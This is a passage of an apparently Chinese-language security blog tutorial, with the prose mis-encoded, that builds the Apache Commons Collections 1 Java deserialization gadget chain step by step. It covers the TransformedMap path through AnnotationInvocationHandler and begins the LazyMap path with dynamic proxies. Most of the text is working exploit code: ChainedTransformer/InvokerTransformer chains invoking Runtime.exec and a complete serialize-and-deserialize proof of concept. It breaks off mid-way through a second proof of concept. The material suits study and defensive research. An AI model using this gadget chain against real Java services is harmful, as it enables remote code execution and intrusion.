java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºå±æ€§ä¸º<code>protected</code>ï¼Œå‘ä¸Šæ‰¾,<code>TransformedMap.decorate()</code>å¯¹å…¶è¿›è¡Œè°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>demo2</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">transforedmap2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//        invokerTransformer.transform(runtime);</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“è°ƒç”¨åˆ°checkSetValue(Object value)ä¸”å…¶valueèƒ½å¤Ÿæ§åˆ¶å°±èƒ½æ‰§è¡Œå‘½ä»¤</p><p><code>AbstractInputCheckedMapDecorator.setValue()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    value = parent.checkSetValue(value);</span><br><span class="line">    <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>AnnotationInvocationHandler.readObject()</code>åœ¨å¯¹memberValueè¿›è¡Œæ“ä½œæ—¶è°ƒç”¨äº†setValue</p><p><a href="https://imgse.com/i/ppEOaNR"><img src="https://s1.ax1x.com/2023/03/05/ppEOaNR.png" alt="ppEOaNR.png"></a></p><p><strong>demo3</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">transforedmap2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//        invokerTransformer.transform(runtime);</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//AnnotationInvocationHandlerç±»æœªå£°åä¸ºpublicï¼Œåªèƒ½åå°„è°ƒç”¨</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstruct</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationHandlerConstruct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstruct.newInstance(Override.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        serilize(o);</span><br><span class="line">        unserlize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serilize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserlize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§£å†³ä¸‰ä¸ªé—®é¢˜</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€ä¸ªæ˜¯ Runtime å¯¹è±¡ä¸èƒ½è¢«åºåˆ—åŒ–</span><br><span class="line">ç¬¬äºŒä¸ªè°ƒç”¨ setValue å‰æœ‰å‡ ä¸ªåˆ¤æ–­</span><br><span class="line">ç¬¬ä¸‰ä¸ªæ˜¯ setValue æ—¶å¯¹è±¡é»˜è®¤ä¸ºAnnotationTypeMismatchExceptionProxy</span><br></pre></td></tr></table></figure><p><strong>Runtime å¯¹è±¡ä¸èƒ½è¢«åºåˆ—åŒ–</strong></p><p><code>Runtime.class</code> å¯ä»¥åºåˆ—åŒ–ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡åå°„æ¥è¿›è¡Œè°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span>  c1.getMethod(<span class="string">&quot;getRuntime&quot;</span> , <span class="literal">null</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) getRuntime.invoke(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">exec.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>æ”¹ä¸º<code>InvokerTransformer</code>å½¢å¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span> , <span class="literal">null</span>&#125;  ).transform(Runtime.class);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span> , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125; , <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;).transform(getRuntimeMethod);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå› ä¸ºä¸€ç›´æ˜¯åä¸€ä¸ªè°ƒç”¨å‰ä¸€ä¸ªï¼Œæ‰€ä»¥å¯ä»¥ç”¨<code>ChainedTransformer</code>è¿›è¡Œæ„é€ </p><p><a href="https://imgse.com/i/ppZZOSK"><img src="https://s1.ax1x.com/2023/03/06/ppZZOSK.png" alt="ppZZOSK.png"></a></p><p>æ„é€ å‡½æ•°è¦æ±‚ä¼ å…¥ä¸€ä¸ªTransformeræ•°ç»„ï¼Œä¹‹ååœ¨transformå‡½æ•°é‡Œè¿›è¡Œé€’å½’è°ƒç”¨</p><p>æ”¹å†™</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span> , <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span> , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125; , <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span>  <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">chainedTransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppZeVOg"><img src="https://s1.ax1x.com/2023/03/06/ppZeVOg.png" alt="ppZeVOg.png"></a></p><p><code> setValue</code><strong>çš„åˆ¤æ–­é—®é¢˜</strong></p><p><a href="https://imgse.com/i/ppZnHFs"><img src="https://s1.ax1x.com/2023/03/06/ppZnHFs.png" alt="ppZnHFs.png"></a></p><p>æ»¡è¶³ç¬¬ä¸€ä¸ªiféœ€è¦ä¸€ä¸ªæœ‰æˆå‘˜æ–¹æ³•çš„æ³¨è§£ç±»ï¼Œä¸”mapé‡Œé¢çš„keyéœ€è¦ä¸æˆå‘˜æ–¹æ³•ç›¸åŒ</p><p>åœ¨targetæ³¨è§£é‡Œé¢æœ‰valueæ–¹æ³•ï¼Œç¬¦åˆæ¡ä»¶ï¼Œæ”¹å†™</p><p><a href="https://imgse.com/i/ppZnvOU"><img src="https://s1.ax1x.com/2023/03/06/ppZnvOU.png" alt="ppZnvOU.png"></a></p><p>ç¬¬äºŒä¸ªifå·²ç»æ»¡è¶³æ¡ä»¶ï¼Œä¸éœ€è¦æ›´æ”¹</p><p><strong>è§£å†³AnnotationTypeMismatchExceptionProxyé—®é¢˜</strong></p><p>setValueé‡Œé»˜è®¤ä¸ºAnnotationTypeMismatchExceptionProxy</p><p><a href="https://imgse.com/i/ppZK359"><img src="https://s1.ax1x.com/2023/03/06/ppZK359.png" alt="ppZK359.png"></a></p><p><strong>ConstantTransformer.transformer</strong>,ä¸ç®¡ä¼ å…¥ä»€ä¹ˆéƒ½ä¼šè¿”å›å›ºå®šçš„å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ§åˆ¶iConstantä¸ºRuntime.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span> , <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span> , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125; , <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">transforedmap2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span> , <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span> , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125; , <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span>  <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(Runtime.class);</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//AnnotationInvocationHandlerç±»æœªå£°åä¸ºpublicï¼Œåªèƒ½åå°„è°ƒç”¨</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstruct</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationHandlerConstruct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstruct.newInstance(Target.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        serilize(o);</span><br><span class="line">        unserlize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serilize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserlize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppZK2Kf"><img src="https://s1.ax1x.com/2023/03/06/ppZK2Kf.png" alt="ppZK2Kf.png"></a></p><h2 id="LazyMapé“¾"><a href="#LazyMapé“¾" class="headerlink" title="LazyMapé“¾"></a>LazyMapé“¾</h2><p><a href="https://imgse.com/i/ppZMj6P"><img src="https://s1.ax1x.com/2023/03/06/ppZMj6P.png" alt="ppZMj6P.png"></a></p><p><strong>LazyMap.get</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªéœ€ä»¤factoryä¸ºå‰é¢æ„é€ å¥½çš„ChainedTransformerå³å¯</p><p><strong>AnnotationInvocationHandler.invoke</strong></p><p><a href="https://imgse.com/i/ppZ10yt"><img src="https://s1.ax1x.com/2023/03/06/ppZ10yt.png" alt="ppZ10yt.png"></a></p><p>æ§åˆ¶memberValuesä¸ºLazyMapå³å¯</p><p>æ€ä¹ˆè°ƒç”¨invokeå‡½æ•°ï¼Ÿ</p><p>javaåŠ¨æ€ä»£ç†</p><p>æ¯ä¸€ä¸ªproxyä»£ç†å®ä¾‹éƒ½æœ‰ä¸€ä¸ªè°ƒç”¨å¤„ç†å™¨InvocationHandlerï¼Œè€Œinvokeæ–¹æ³•å°±æ˜¯ä»£ç†å¯¹è±¡è°ƒç”¨æ–¹æ³•æ—¶çš„è°ƒç”¨å¤„ç†å™¨ã€‚åœ¨AnnotationInvocationHandlerçš„readObjectæ–¹æ³•ä¸‹ï¼Œthis.memberValueså¯æ§ï¼Œä»¤å…¶ä¸ºä¸€ä¸ªAnnotationInvocationHandlerç±»ç”Ÿæˆçš„åŠ¨æ€ä»£ç†å¯¹è±¡æ—¶ï¼Œåœ¨è°ƒç”¨entrySet()æ–¹æ³•æ—¶ï¼Œå°±ä¼šè‡ªåŠ¨å»è°ƒç”¨invokeæ–¹æ³•</p><p><strong>POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 